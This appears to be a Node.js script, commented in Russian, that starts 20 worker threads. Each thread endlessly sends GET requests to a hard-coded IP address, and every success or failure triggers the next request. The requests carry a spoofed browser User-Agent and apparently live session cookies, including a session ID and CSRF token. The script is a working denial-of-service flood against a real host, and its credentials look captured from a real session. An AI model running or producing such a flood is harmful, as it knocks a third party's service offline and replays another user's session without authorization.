const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const axios = require('axios');

// Замените следующими значениями:
const url = 'http://88.198.48.45'; // Замените на URL сайта
const userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36'; // Укажите свой User-Agent
const acceptHeader = 'application/json'; // Укажите заголовок Accept

// Создаем строку с куками
const cookies = [
  '_ga=GA1.2.1789629642.1694354445',
  '_ga_25GCGTWN8K=GS1.2.1694591098.14.1.1694591268.40.0.0',
  '_ga_3YHTYDHHZK=GS1.1.1694595105.15.1.1694595106.59.0.0',
  '_gat_UA-41633741-1=1',
  '_gcl_au=1.1.1010881320.1694025302',
  '_gid=GA1.2.1801167643.1694354454',
  '_ym_d=1694025326',
  '_ym_isad=1',
  '_ym_uid=1694025326730301986',
  'tmr_lvid=faa48f03cf178ef64b2deb23802b7add',
  'tmr_lvidTS=1694025304427',
  'csrftoken=cX2SVnXy8Fp21uZAEOsuZa2SqOHD2SP5GIs1EIsyb0baF7FZuPIoJTjQHTxSarjY',
  'sessionid=oks6ylq73wipcjb76d8gp9ano86p9qat',
  'tmr_detect=1%7C1694591100465',
].join('; ');

// Создаем конфигурацию для Axios с заданными заголовками и куками
const axiosConfig = {
  headers: {
    'User-Agent': userAgent,
    'Accept': acceptHeader,
    'Cookie': cookies,
  },
};

// Функция, которую будут выполнять рабочие потоки
function runWorker() {
  axios.get(url, axiosConfig)
    .then((response) => {
      console.log('Статус код:', response.status);
      // Выведите тело ответа, если необходимо
      // console.log('Тело ответа:', response.data);
      // После завершения запроса, запускаем функцию снова для бесконечного выполнения
      runWorker();
    })
    .catch((error) => {
      console.error('Произошла ошибка:', error);
      // После ошибки также запускаем функцию снова для бесконечного выполнения
      runWorker();
    });
}

// Главный поток
if (isMainThread) {
  // Создаем 20 рабочих потоков
  const numWorkers = 20;
  for (let i = 0; i < numWorkers; i++) {
    new Worker(__filename, { workerData: {} });
  }
} else {
  // Этот код будет выполняться в каждом рабочем потоке
  runWorker();
}
